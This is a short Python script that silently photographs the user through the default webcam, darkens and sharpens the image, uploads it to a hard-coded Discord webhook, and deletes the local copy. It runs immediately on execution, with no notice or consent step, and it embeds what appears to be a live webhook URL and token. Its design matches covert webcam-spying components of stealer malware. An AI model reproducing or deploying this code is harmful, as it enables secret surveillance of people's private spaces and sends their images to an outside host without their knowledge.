import cv2
import os
import time
import requests
import tempfile
import numpy as np  # Import numpy for the sharpening filter

# Helper function to get the system's temporary directory
def get_temp_dir():
    return tempfile.gettempdir()

# Function to adjust brightness and contrast
def adjust_brightness_contrast(image, alpha=1, beta=0):
    """
    Adjust the brightness and contrast of the image.
    alpha: Control contrast (1.0 = normal, 1.5 = increase contrast)
    beta: Control brightness (0 = normal, -50 = decrease brightness)
    """
    return cv2.convertScaleAbs(image, alpha=alpha, beta=beta)

# Function to capture a photo and send it to the Discord webhook
def capture_and_send_to_webhook():
    # Open the default camera (index 0)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Failed to open the camera.")
        return

    # Set higher resolution for better image quality
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)  # 1920px width
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)  # 1080px height

    # Capture image
    ret, frame = cap.read()
    cap.release()

    if not ret:
        print("Failed to capture image.")
        return

    # Improve image quality (optional)
    # Apply sharpening filter for better quality
    kernel = np.array([[0, -1, 0],
                       [-1, 5,-1],
                       [0, -1, 0]])
    frame = cv2.filter2D(frame, -1, kernel)

    # Adjust brightness and contrast
    frame = adjust_brightness_contrast(frame, alpha=1.5, beta=-120)  # Lowered brightness

    # Save the image to a temporary file
    temp_dir = get_temp_dir()  # Get system temp directory
    image_path = os.path.join(temp_dir, "webcam.png")  # Save image in temp directory
    cv2.imwrite(image_path, frame)

    # Send the image to the Discord webhook
    send_image_to_webhook(image_path)

    # Remove the image file after sending it
    os.remove(image_path)

# Function to send the image to the webhook
def send_image_to_webhook(image_path):
    webhook_url = 'https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5'

    with open(image_path, 'rb') as f:
        files = {
            'file': ('webcam.png', f, 'image/png')
        }
        data = {
            'content': 'Here is the webcam photo!'
        }

        # Send the image to the webhook
        response = requests.post(webhook_url, data=data, files=files)
        
        if response.status_code == 204:
            print("Successfully sent the image to the webhook!")
        else:
            print(f"Failed to send image. Status code: {response.status_code}")

# Capture and send the photo
capture_and_send_to_webhook()